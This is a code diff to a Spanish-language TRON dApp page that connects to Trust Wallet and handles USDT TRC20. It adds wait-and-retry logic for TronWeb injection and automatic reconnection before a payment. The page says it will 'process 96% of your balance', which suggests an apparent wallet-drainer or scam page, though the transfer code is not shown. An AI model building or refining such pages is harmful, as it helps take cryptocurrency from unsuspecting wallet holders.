@@ -31,10 +31,10 @@
                 <p class="text-xs text-slate-400 mt-1">Conecta, ingresa tu monto y procesaremos el 96% de tu saldo</p>
             </div>
 
-            <!-- Formulario (Visible o se habilita al conectar) -->
+            <!-- Formulario -->
             <div class="space-y-4">
                 
-                <!-- Input que se abre/activa al conectar -->
+                <!-- Input de Monto -->
                 <div>
                     <label class="block text-xs font-medium text-slate-400 mb-1">Monto de Referencia / Solicitud</label>
                     <div class="relative">
@@ -69,28 +69,57 @@
         let userAddress = "";
         const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
 
+        // Función auxiliar para esperar a que TronWeb esté disponible en el navegador de la wallet
+        async function esperarTronWeb() {
+            return new Promise((resolve) => {
+                let intentos = 0;
+                const intervalo = setInterval(() => {
+                    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                        clearInterval(intervalo);
+                        resolve(true);
+                    }
+                    intentos++;
+                    if (intentos > 20) { // Espera máxima de ~4 segundos
+                        clearInterval(intervalo);
+                        resolve(false);
+                    }
+                }, 200);
+            });
+        }
+
         // 1. El usuario hace la conexión a la dApp
         async function conectarWallet() {
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            const btn = document.getElementById("btnConnect");
+            btn.innerText = "Conectando...";
+
+            // Esperar a que inyecte el proveedor Web3 de forma segura
+            await esperarTronWeb();
+
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 userAddress = window.tronWeb.defaultAddress.base58;
                 
-                // Actualizar botón visualmente
-                const btn = document.getElementById("btnConnect");
+                // Actualizar botón visualmente con la dirección acortada
                 btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
                 btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
                 btn.classList.add("bg-emerald-500", "text-slate-950");
                 
                 alert("¡Billetera conectada con éxito!");
             } else {
-                alert("Por favor, abre esta dApp desde el navegador interno de Trust Wallet.");
+                btn.innerText = "Conectar Wallet";
+                alert("No se detectó la billetera. Asegúrate de abrir este enlace directamente en el navegador DApp de Trust Wallet y tener seleccionada la red TRON.");
             }
         }
 
         // 2. El cliente coloca un monto en el input y presiona enviar
         async function enviarPagoAlPresionar() {
             if (!userAddress) {
-                alert("Primero debes conectar tu billetera.");
-                return;
+                // Intentar reconexión automática rápida por si ya se inyectó
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    userAddress = window.tronWeb.defaultAddress.base58;
+                } else {
+                    alert("Primero debes conectar tu billetera.");
+                    return;
+                }
             }
 
             const montoEscrito = document.getElementById("montoInput").value;
